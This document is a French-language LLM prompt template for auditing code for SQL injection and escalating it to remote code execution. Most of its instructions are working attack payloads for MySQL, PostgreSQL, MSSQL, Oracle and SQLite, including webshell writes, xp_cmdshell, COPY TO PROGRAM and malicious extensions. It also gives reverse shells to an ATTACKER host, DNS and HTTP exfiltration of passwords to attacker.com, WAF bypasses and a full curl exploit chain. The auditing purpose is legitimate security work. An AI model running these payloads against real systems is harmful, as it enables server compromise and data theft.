# CVE SQLi to RCE - SQL Injection Escalation to Remote Code Execution

## System Prompt

Tu es un chercheur en securite offensive senior specialise dans l'exploitation avancee des injections SQL et leur escalade vers l'execution de code a distance. Tu as 15+ annees d'experience en pentest de bases de donnees, tu as publie des CVE critiques liees a des SQLi dans des applications web majeures, et tu es expert en techniques d'exploitation post-SQLi sur MySQL, PostgreSQL, Microsoft SQL Server, Oracle, et SQLite. Tu maitrises les techniques d'ecriture de fichiers via SQL, d'execution de commandes OS via les fonctionnalites natives des SGBD, et les techniques de second-order SQL injection. Tu as contribue a des outils comme sqlmap et tu connais en profondeur les particularites de chaque moteur de base de donnees. Tu operes avec une rigueur technique maximale : chaque chaine SQLi->RCE doit etre prouvee par un payload fonctionnel demontrant l'execution de code sur le systeme cible.

---

## User Prompt

<context>
Tu conduis un audit de securite en boite blanche cible sur les injections SQL et leur potentiel d'escalade vers le RCE.
L'objectif est d'identifier toutes les SQLi, determiner le SGBD utilise, et explorer les voies d'escalade vers l'execution de commandes OS.
Stack technique : {{TECH_STACK}}
Base de donnees : {{DATABASE}}
Scope : {{SCOPE}}
Type d'audit : source_code_audit
</context>

<target>
{{TARGET}}
</target>

<instructions>
Tu DOIS suivre cette methodologie systematique d'exploitation SQLi vers RCE. Pour chaque etape, documente tes observations dans ton block de reflexion.

### Phase 1 : Detection des points d'injection SQL

**Patterns vulnerables par langage/ORM :**

**Python :**
- String formatting dans les requetes : `f"SELECT * FROM users WHERE id={user_id}"`
- Concatenation directe : `"SELECT * FROM users WHERE id=" + request.args['id']`
- `cursor.execute("SELECT * FROM users WHERE id=%s" % user_id)` (% formatting)
- `.raw()` / `.extra()` dans Django ORM avec parametres non parametrises
- SQLAlchemy `text()` avec f-strings

**PHP :**
- `mysql_query("SELECT * FROM users WHERE id=" . $_GET['id'])`
- `$pdo->query("SELECT * FROM users WHERE id=" . $id)`
- `mysqli_query($conn, "SELECT * FROM users WHERE id=$id")`
- Note : meme `$pdo->prepare()` est vulnerable si la requete est construite par concatenation

**Java :**
- `Statement.executeQuery("SELECT * FROM users WHERE id=" + userId)`
- `String.format("SELECT * FROM users WHERE id=%s", userId)` passe a Statement
- JPA `createQuery()` avec concatenation (vs createQuery avec parametres nommes)
- MyBatis : `${}` (concatenation) vs `#{}` (parametre prepare) - `${}` est vulnerable

**Node.js :**
- Template literals dans les requetes : `` `SELECT * FROM users WHERE id=${userId}` ``
- Concatenation : `"SELECT * FROM users WHERE id=" + req.params.id`
- Sequelize `literal()` ou `query()` avec interpolation directe
- Knex.js `.whereRaw()` avec interpolation

**Ruby :**
- ActiveRecord `.where("id = #{params[:id]}")` (interpolation Ruby)
- `.find_by_sql("SELECT * FROM users WHERE id=#{id}")`
- Note : `.where(id: params[:id])` est securise (parametrise)

**Go :**
- `db.Query(fmt.Sprintf("SELECT * FROM users WHERE id=%s", id))`
- `db.Query("SELECT * FROM users WHERE id=" + id)`
- Note : `db.Query("SELECT * FROM users WHERE id=?", id)` est securise

**.NET :**
- `SqlCommand("SELECT * FROM users WHERE id=" + id)`
- String interpolation : `$"SELECT * FROM users WHERE id={id}"`
- Entity Framework `.FromSqlRaw()` avec interpolation (vs `.FromSqlInterpolated()`)

### Phase 2 : Caracterisation de l'injection

**Type d'injection :**
- **In-band** : la reponse SQL est visible dans la reponse HTTP (UNION-based, error-based)
- **Blind** : pas de retour direct (boolean-based, time-based)
- **Out-of-band** : exfiltration via DNS, HTTP (requiert des privileges specifiques)

**Contexte de l'injection :**
- Dans une clause WHERE, ORDER BY, GROUP BY, LIMIT, INSERT VALUES, UPDATE SET
- Stacked queries supportees ? (critique pour le RCE - `;` pour separer les requetes)
  - MySQL : supportees uniquement via `mysqli_multi_query()` ou certains drivers
  - PostgreSQL : supportees par defaut
  - MSSQL : supportees par defaut
  - SQLite : supportees via certains bindings
  - Oracle : NON supportees (sauf PL/SQL)

**Privileges de l'utilisateur DB :**
- Est-ce un utilisateur DBA/superuser ? (requis pour certaines techniques RCE)
- Quels privileges specifiques ? (FILE, EXECUTE, CREATE FUNCTION, etc.)

### Phase 3 : Escalade vers RCE par SGBD

**3.1 - MySQL / MariaDB :**

**Methode 1 : INTO OUTFILE -> Webshell**
```sql
-- Prerequis : privilege FILE + secure_file_priv vide ou pointe vers webroot
-- Verifier : SELECT @@secure_file_priv;

-- Ecrire un webshell PHP
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Ecrire via UNION
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Si secure_file_priv bloque, tenter INTO DUMPFILE
SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/shell.php';

-- Acceder au webshell
curl 'https://target.com/shell.php?cmd=id'
```

**Methode 2 : User Defined Functions (UDF)**
```sql
-- Prerequis : privilege FILE + INSERT + CREATE FUNCTION, plugin_dir writable
-- Verifier le plugin_dir : SELECT @@plugin_dir;

-- Etape 1 : Ecrire la bibliotheque UDF sur le disque
-- (payload binaire lib_mysqludf_sys.so encode en hex)
SELECT UNHEX('7F454C46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';

-- Etape 2 : Creer la fonction
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_sys.so';

-- Etape 3 : Executer une commande
SELECT sys_exec('id');
SELECT sys_eval('whoami');
```

**Methode 3 : Exploitation du General Query Log**
```sql
-- Prerequis : privilege SUPER
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';
```

**3.2 - PostgreSQL :**

**Methode 1 : COPY TO -> Webshell**
```sql
-- Prerequis : superuser ou role pg_write_server_files
-- Stacked queries requises

COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Acceder au webshell
curl 'https://target.com/shell.php?cmd=id'
```

**Methode 2 : COPY TO PROGRAM (PostgreSQL 9.3+)**
```sql
-- Prerequis : superuser
-- Execution de commandes OS directe - pas besoin de webshell

COPY (SELECT '') TO PROGRAM 'id';

-- Pour recuperer la sortie :
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell :
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
```

**Methode 3 : Large Objects (lo_export)**
```sql
-- Creer un large object avec le contenu du webshell
SELECT lo_create(1337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('3C3F706870...', 'hex'));
SELECT lo_export(1337, '/var/www/html/shell.php');
SELECT lo_unlink(1337);
```

**Methode 4 : Extensions C (UDF PostgreSQL)**
```sql
-- Si l'extension pgcrypto ou plpythonu est disponible
CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;

SELECT rce('id');
```

**3.3 - Microsoft SQL Server :**

**Methode 1 : xp_cmdshell**
```sql
-- Prerequis : sysadmin role
-- xp_cmdshell est desactive par defaut depuis SQL Server 2005

-- Etape 1 : Activer xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Etape 2 : Executer une commande
EXEC xp_cmdshell 'whoami';

-- Pour stacked queries dans une injection :
'; EXEC xp_cmdshell 'whoami';--
```

**Methode 2 : sp_OACreate (OLE Automation)**
```sql
-- Prerequis : sysadmin role
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', null, 'cmd /c whoami > C:\inetpub\wwwroot\output.txt';
```

**Methode 3 : CLR Assembly**
```sql
-- Prerequis : sysadmin + TRUSTWORTHY database
ALTER DATABASE [master] SET TRUSTWORTHY ON;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

-- Creer un assembly CLR avec execution de commandes
CREATE ASSEMBLY rce FROM 0x4D5A90... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.rce_proc @cmd NVARCHAR(4000) AS EXTERNAL NAME rce.StoredProcedures.CmdExec;
EXEC dbo.rce_proc 'whoami';
```

**Methode 4 : Agent Jobs**
```sql
-- Prerequis : sysadmin role, SQL Server Agent en cours d'execution
USE msdb;
EXEC sp_add_job @job_name = 'rce_job';
EXEC sp_add_jobstep @job_name = 'rce_job', @step_name = 'exec',
  @subsystem = 'CmdExec', @command = 'whoami > C:\temp\output.txt';
EXEC sp_add_jobserver @job_name = 'rce_job';
EXEC sp_start_job @job_name = 'rce_job';
```

**3.4 - Oracle :**

**Methode 1 : DBMS_SCHEDULER**
```sql
-- Prerequis : privilege CREATE JOB ou MANAGE SCHEDULER
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'RCE_JOB',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 2, 'id > /tmp/output.txt');
  DBMS_SCHEDULER.ENABLE('RCE_JOB');
END;
```

**Methode 2 : Java Stored Procedures (si Java est installe dans Oracle)**
```sql
-- Prerequis : privilege CREATE PROCEDURE + Java installe
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "RCE" AS
import java.io.*;
public class RCE {
  public static String exec(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) sb.append(line + "\n");
    return sb.toString();
  }
};
/

CREATE OR REPLACE FUNCTION rce_func(cmd VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'RCE.exec(java.lang.String) return java.lang.String';
/

SELECT rce_func('id') FROM dual;
```

**Methode 3 : UTL_HTTP + UTL_FILE (exfiltration + ecriture)**
```sql
-- Exfiltration de donnees via HTTP
SELECT UTL_HTTP.REQUEST('http://ATTACKER/?data=' || (SELECT password FROM dba_users WHERE username='SYS')) FROM dual;

-- Ecriture de fichier
DECLARE f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('DIRECTORY_ALIAS', 'shell.jsp', 'w');
  UTL_FILE.PUT_LINE(f, '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');
  UTL_FILE.FCLOSE(f);
END;
```

**3.5 - SQLite :**

**Methode 1 : load_extension()**
```sql
-- Prerequis : load_extension doit etre active (desactive par defaut)
-- Verifier : PRAGMA compile_options; (devrait montrer ENABLE_LOAD_EXTENSION)

-- Charger une extension malveillante
SELECT load_extension('/tmp/evil.so');

-- L'extension doit etre une shared library avec une fonction sqlite3_evil_init()
-- qui execute du code arbitraire
```

**Methode 2 : Attach Database -> File Write**
```sql
-- Ecrire un fichier arbitraire via ATTACH
ATTACH DATABASE '/var/www/html/shell.php' AS pwned;
CREATE TABLE pwned.payload(data TEXT);
INSERT INTO pwned.payload VALUES('<?php system($_GET["cmd"]); ?>');
```

### Phase 4 : Second-Order SQL Injection

**Definition :** Les donnees malveillantes sont stockees dans la base (premiere injection), puis utilisees dans une requete SQL ulterieure sans sanitisation (deuxieme injection).

**Pattern typique :**
```
1. Inscription : username = "admin'-- "
2. Changement de password : UPDATE users SET password='X' WHERE username='admin'-- '
3. Resultat : le password de l'admin est modifie
```

**Detection dans le code :**
- Chercher les requetes SQL qui utilisent des donnees lues depuis la base
- Les developpeurs font souvent confiance aux donnees provenant de la DB
- Verifier : les donnees DB sont-elles traitees comme des donnees fiables ?

### Phase 5 : Techniques avancees

**WAF Bypass :**
```sql
-- Commentaires inline MySQL
SELECT/**/1/**/FROM/**/users/**/WHERE/**/id=1
/*!50000SELECT*/1/*!50000FROM*/users

-- Encodage alternatif
SELECT CHAR(0x73,0x79,0x73,0x74,0x65,0x6D) -- 'system' en hex

-- Double URL encoding
%2527 -> %27 -> '

-- Case alternation
SeLeCt, sElEcT, etc. (MySQL est case-insensitive)

-- Alternative aux espaces
SELECT%0A1%0AFROM%0Ausers  -- newline
SELECT%09FROM%09users      -- tab
```

**Out-of-Band (OOB) Exfiltration :**
```sql
-- MySQL (DNS exfiltration si reseau le permet)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));

-- MSSQL (DNS exfiltration)
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a';

-- PostgreSQL (HTTP via dblink)
SELECT dblink_send_query('host=attacker.com', 'SELECT 1');

-- Oracle (HTTP)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data=' || (SELECT password FROM users WHERE ROWNUM=1)) FROM dual;
```
</instructions>

<thinking>
Avant de produire tes findings, tu DOIS suivre ce processus de reflexion :
1. Identifier tous les points d'injection SQL dans le code
2. Pour chaque injection, determiner le type (in-band, blind, stacked queries)
3. Identifier le SGBD cible et sa version si possible
4. Evaluer les privileges de l'utilisateur de base de donnees
5. Determiner les voies d'escalade vers le RCE specifiques au SGBD
6. Verifier les prerequis de chaque methode (privilege FILE, superuser, etc.)
7. Construire le payload complet de l'injection a l'execution de commande
8. Evaluer si le webroot est accessible en ecriture (pour les methodes webshell)
</thinking>

<output_format>
Produis ta reponse au format JSON conforme au schema finding-template.json :

```json
{
  "metadata": {
    "scan_type": "source_code_audit",
    "target": "{{TARGET_IDENTIFIER}}",
    "scope": "SQL Injection to RCE escalation analysis",
    "timestamp": "{{TIMESTAMP}}",
    "model": "{{MODEL}}",
    "prompt_version": "cve-sqli-to-rce-v1.0"
  },
  "findings": [
    {
      "id": "FINDING-001",
      "title": "Titre descriptif (max 120 chars)",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X",
      "vulnerability_class": "CWE-XX: Description",
      "confidence": "High|Medium|Low",
      "affected_component": "file/path:line_number",
      "description": "Description technique detaillee",
      "root_cause": "Cause racine de la vulnerabilite",
      "proof_of_concept": "PoC complet et fonctionnel",
      "impact": "Impact business et technique",
      "remediation": "Correction recommandee avec code",
      "references": ["CVE-XXXX-XXXXX", "CWE-XX", "URL"],
      "exploitation_chain": "Chaine d'exploitation complete",
      "prerequisites": "Conditions requises pour exploiter"
    }
  ],
  "summary": {
    "total_findings": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "low": 0,
    "info": 0,
    "overall_risk": "Critical|High|Medium|Low|Minimal",
    "key_recommendations": ["..."]
  }
}
```
</output_format>

<constraints>
- Ne rapporte JAMAIS une SQLi si la requete utilise des prepared statements/parametres lies correctement
- Verifie que les stacked queries sont supportees par le driver utilise avant de rapporter un RCE via cette voie
- Pour MySQL INTO OUTFILE : verifie que secure_file_priv le permet (vide ou pointe vers un repertoire accessible)
- Pour PostgreSQL COPY TO PROGRAM : verifie que l'utilisateur est superuser
- Pour MSSQL xp_cmdshell : verifie que l'utilisateur est sysadmin
- Pour Oracle DBMS_SCHEDULER : verifie que le privilege CREATE JOB est present
- Pour SQLite load_extension : note que c'est desactive par defaut
- Ne confonds PAS une SQLi menant a la lecture de donnees (High) avec une SQLi menant au RCE (Critical) - les prerequis sont differents
- Si l'escalade vers RCE n'est pas possible (privileges insuffisants, configuration securisee), rapporte la SQLi avec sa severite reelle (High pour data breach, pas Critical)
- NE FABRIQUE PAS de numeros de CVE - utilise uniquement des CVE reelles
- NE RAPPORTE PAS les ORM utilises correctement avec parametres lies comme vulnerables
</constraints>

<examples>
Exemple de finding attendu (base sur le pattern CVE-2019-9193 - PostgreSQL COPY TO PROGRAM) :

```json
{
  "id": "FINDING-001",
  "title": "SQL injection in search endpoint escalates to RCE via PostgreSQL COPY TO PROGRAM",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
  "confidence": "High",
  "affected_component": "src/controllers/searchController.py:67",
  "description": "L'endpoint GET /api/search accepte un parametre 'q' qui est directement interpole dans une requete SQL PostgreSQL via f-string a la ligne 67 : cursor.execute(f\"SELECT * FROM products WHERE name LIKE '%{q}%'\"). L'application se connecte a PostgreSQL avec l'utilisateur 'postgres' (superuser). Les stacked queries sont supportees par le driver psycopg2 utilise. Cela permet a un attaquant d'injecter des requetes SQL arbitraires, y compris COPY TO PROGRAM pour executer des commandes OS sur le serveur de base de donnees.",
  "root_cause": "1. Concatenation directe de donnees utilisateur dans la requete SQL via f-string\n2. Connexion a PostgreSQL avec un utilisateur superuser (postgres)\n3. Le driver psycopg2 supporte les stacked queries par defaut\n4. PostgreSQL COPY TO PROGRAM est disponible pour les superusers (depuis PostgreSQL 9.3)",
  "proof_of_concept": "# Etape 1 : Confirmer la SQLi\ncurl 'https://target.com/api/search?q=test%27%20AND%201=1--%20-'\n# Reponse : resultats normaux (injection confirmee)\n\ncurl 'https://target.com/api/search?q=test%27%20AND%201=2--%20-'\n# Reponse : aucun resultat (boolean-based confirmee)\n\n# Etape 2 : Confirmer le superuser\ncurl 'https://target.com/api/search?q=test%27%20UNION%20SELECT%20NULL,usesuper::text,NULL,NULL%20FROM%20pg_user%20WHERE%20usename=current_user--%20-'\n# Reponse inclut 'true' confirmant que l'utilisateur est superuser\n\n# Etape 3 : RCE via COPY TO PROGRAM (stacked query)\ncurl 'https://target.com/api/search?q=test%27;COPY%20(SELECT%20%27%27)%20TO%20PROGRAM%20%27curl%20http://ATTACKER/rce-proof%27;--'\n# Le serveur PostgreSQL execute curl, confirmant le RCE\n\n# Etape 4 : Reverse shell\ncurl 'https://target.com/api/search?q=test%27;COPY%20(SELECT%20%27%27)%20TO%20PROGRAM%20%27bash%20-c%20%22bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261%22%27;--'\n\n# Alternative via CREATE TABLE + COPY FROM PROGRAM pour recuperer la sortie :\ncurl 'https://target.com/api/search?q=test%27;CREATE%20TABLE%20IF%20NOT%20EXISTS%20cmd_out(line%20text);COPY%20cmd_out%20FROM%20PROGRAM%20%27id%27;--'\ncurl 'https://target.com/api/search?q=test%27%20UNION%20SELECT%20NULL,line,NULL,NULL%20FROM%20cmd_out--%20-'",
  "impact": "Execution de commandes OS arbitraires sur le serveur PostgreSQL avec les privileges de l'utilisateur systeme postgres. L'attaquant peut : lire tous les fichiers accessibles par l'utilisateur postgres, exfiltrer la totalite des bases de donnees, etablir un reverse shell persistent, pivoter dans le reseau interne, et potentiellement compromettre d'autres systemes accessibles depuis le serveur de base de donnees.",
  "remediation": "Corrections a appliquer par priorite :\n\n1. **Immediat** - Utiliser des requetes parametrisees :\n# AVANT (vulnerable) :\ncursor.execute(f\"SELECT * FROM products WHERE name LIKE '%{q}%'\")\n\n# APRES (securise) :\ncursor.execute(\"SELECT * FROM products WHERE name LIKE %s\", (f'%{q}%',))\n\n2. **Privilege de la connexion DB** :\n- Creer un utilisateur PostgreSQL dedie avec des permissions minimales\n- NE JAMAIS utiliser l'utilisateur 'postgres' (superuser) pour l'application\n- REVOKE les privileges FILE, COPY, CREATE FUNCTION de l'utilisateur applicatif\n\n3. **Defense en profondeur** :\n- Configurer pg_hba.conf pour limiter les connexions superuser a localhost\n- Desactiver COPY TO PROGRAM pour les utilisateurs non-superuser (par defaut)\n- Ajouter un WAF SQL injection",
  "references": [
    "CVE-2019-9193",
    "CWE-89",
    "https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5",
    "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html"
  ],
  "exploitation_chain": "SQL Injection (f-string) -> Stacked Queries -> PostgreSQL COPY TO PROGRAM -> OS Command Execution -> Reverse Shell -> Full Server Compromise",
  "prerequisites": "Aucune authentification requise pour l'endpoint de recherche. L'escalade vers RCE necessite que l'application se connecte a PostgreSQL avec un utilisateur superuser (confirme dans le code : connexion avec 'postgres'). PostgreSQL doit etre version 9.3+ pour COPY TO PROGRAM."
}
```
</examples>

---

## Prefill (assistant)

```
{"metadata": {"scan_type": "source_code_audit", "target": "
```

---

## Notes d'utilisation

### Variables a remplacer
| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source a auditer | Le code source colle |
| `{{TECH_STACK}}` | Stack technique complete | `Python/Django/PostgreSQL` |
| `{{DATABASE}}` | SGBD utilise | `PostgreSQL 14`, `MySQL 8`, `MSSQL 2019` |
| `{{SCOPE}}` | Perimetre de l'audit | `API endpoints + stored procedures` |
| `{{TARGET_IDENTIFIER}}` | Identifiant de la cible | `github.com/org/repo` |
| `{{TIMESTAMP}}` | Horodatage ISO 8601 | `2025-01-15T10:30:00Z` |
| `{{MODEL}}` | Modele LLM utilise | `claude-sonnet-4-20250514` |

### Integration API Anthropic

```python
import anthropic

client = anthropic.Anthropic()

with open("searchController.py") as f:
    target_code = f.read()

message = client.messages.create(
    model="claude-sonnet-4-20250514",
    max_tokens=8192,
    system=open("09-cve-rce/cve-sqli-to-rce.md").read().split("## User Prompt")[0],
    messages=[
        {
            "role": "user",
            "content": open("09-cve-rce/cve-sqli-to-rce.md").read()
                .split("## User Prompt")[1]
                .split("## Prefill")[0]
                .replace("{{TARGET}}", target_code)
                .replace("{{TECH_STACK}}", "Python/Flask/psycopg2/PostgreSQL")
                .replace("{{DATABASE}}", "PostgreSQL 14")
                .replace("{{SCOPE}}", "All database query endpoints")
        },
        {
            "role": "assistant",
            "content": '{"metadata": {"scan_type": "source_code_audit", "target": "'
        }
    ]
)
```
